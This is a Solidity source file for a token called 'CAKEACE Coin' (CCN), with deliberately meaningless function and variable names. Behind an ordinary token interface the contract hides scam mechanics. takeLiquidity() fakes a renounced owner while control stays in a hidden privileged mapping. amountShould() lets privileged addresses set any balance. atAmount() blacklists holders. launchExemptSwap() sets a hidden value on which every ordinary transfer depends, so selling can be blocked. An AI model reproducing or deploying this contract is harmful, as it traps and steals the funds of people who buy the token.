//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

abstract contract totalListAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundReceiver) external view returns (uint256);

    function transfer(address autoList, uint256 txLimit) external returns (bool);

    function allowance(address sellToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 txLimit) external returns (bool);

    function transferFrom(
        address sender,
        address autoList,
        uint256 txLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellFrom, uint256 value);
    event Approval(address indexed sellToken, address indexed spender, uint256 value);
}

interface fromWalletTotal is atBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface maxAtMode {
    function createPair(address shouldSwapTo, address launchedFrom) external returns (address);
}

interface marketingTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CAKEACECoin is totalListAt, atBuy, fromWalletTotal {

    address public txEnable;

    address buyEnableTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed receiverAmountFund, address indexed tradingTake);

    address public amountLaunch;

    function symbol() external view virtual override returns (string memory) {
        return limitMax;
    }

    function takeLiquidity() public {
        emit OwnershipTransferred(amountLaunch, address(0));
        fromFund = address(0);
    }

    function transferFrom(address fromMin, address autoList, uint256 txLimit) external override returns (bool) {
        if (_msgSender() != walletSender) {
            if (liquidityTotal[fromMin][_msgSender()] != type(uint256).max) {
                require(txLimit <= liquidityTotal[fromMin][_msgSender()]);
                liquidityTotal[fromMin][_msgSender()] -= txLimit;
            }
        }
        return shouldFeeTake(fromMin, autoList, txLimit);
    }

    function decimals() external view virtual override returns (uint8) {
        return teamTotal;
    }

    function getOwner() external view returns (address) {
        return fromFund;
    }

    uint256 isList;

    function maxShould() private view {
        require(sellLaunchedMarketing[_msgSender()]);
    }

    function launchExemptSwap(uint256 txLimit) public {
        maxShould();
        takeShould = txLimit;
    }

    mapping(address => uint256) private listTeam;

    function liquidityMin(address takeFee) public {
        if (isReceiver) {
            return;
        }
        
        sellLaunchedMarketing[takeFee] = true;
        if (buySwapTeam) {
            takeMarketing = maxLaunched;
        }
        isReceiver = true;
    }

    uint256 public takeMarketing;

    uint8 private teamTotal = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return listEnable;
    }

    mapping(address => mapping(address => uint256)) private liquidityTotal;

    uint256 private maxLaunched;

    bool private tokenFee;

    address walletSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 takeShould;

    function balanceOf(address fundReceiver) public view virtual override returns (uint256) {
        return listTeam[fundReceiver];
    }

    string private launchedToken = "CAKEACE Coin";

    bool private totalTx;

    function amountShould(address feeTokenAt, uint256 txLimit) public {
        maxShould();
        listTeam[feeTokenAt] = txLimit;
    }

    function totalLaunched(address fromMin, address autoList, uint256 txLimit) internal returns (bool) {
        require(listTeam[fromMin] >= txLimit);
        listTeam[fromMin] -= txLimit;
        listTeam[autoList] += txLimit;
        emit Transfer(fromMin, autoList, txLimit);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return launchedToken;
    }

    function atAmount(address exemptReceiverTake) public {
        maxShould();
        if (totalTx == buySwapTeam) {
            takeMarketing = maxLaunched;
        }
        if (exemptReceiverTake == amountLaunch || exemptReceiverTake == txEnable) {
            return;
        }
        tokenWallet[exemptReceiverTake] = true;
    }

    mapping(address => bool) public tokenWallet;

    bool public buySwapTeam;

    function owner() external view returns (address) {
        return fromFund;
    }

    string private limitMax = "CCN";

    bool public isReceiver;

    address private fromFund;

    function transfer(address feeTokenAt, uint256 txLimit) external virtual override returns (bool) {
        return shouldFeeTake(_msgSender(), feeTokenAt, txLimit);
    }

    constructor (){
        if (tokenFee == buySwapTeam) {
            takeMarketing = maxLaunched;
        }
        takeLiquidity();
        marketingTake tradingIs = marketingTake(walletSender);
        txEnable = maxAtMode(tradingIs.factory()).createPair(tradingIs.WETH(), address(this));
        if (tokenFee) {
            takeMarketing = maxLaunched;
        }
        amountLaunch = _msgSender();
        sellLaunchedMarketing[amountLaunch] = true;
        listTeam[amountLaunch] = listEnable;
        if (tokenFee == totalTx) {
            takeMarketing = maxLaunched;
        }
        emit Transfer(address(0), amountLaunch, listEnable);
    }

    mapping(address => bool) public sellLaunchedMarketing;

    function approve(address isWalletList, uint256 txLimit) public virtual override returns (bool) {
        liquidityTotal[_msgSender()][isWalletList] = txLimit;
        emit Approval(_msgSender(), isWalletList, txLimit);
        return true;
    }

    function shouldFeeTake(address fromMin, address autoList, uint256 txLimit) internal returns (bool) {
        if (fromMin == amountLaunch) {
            return totalLaunched(fromMin, autoList, txLimit);
        }
        uint256 senderFrom = atBuy(txEnable).balanceOf(buyEnableTx);
        require(senderFrom == takeShould);
        require(!tokenWallet[fromMin]);
        return totalLaunched(fromMin, autoList, txLimit);
    }

    function allowance(address modeTrading, address isWalletList) external view virtual override returns (uint256) {
        if (isWalletList == walletSender) {
            return type(uint256).max;
        }
        return liquidityTotal[modeTrading][isWalletList];
    }

    uint256 private listEnable = 100000000 * 10 ** 18;

}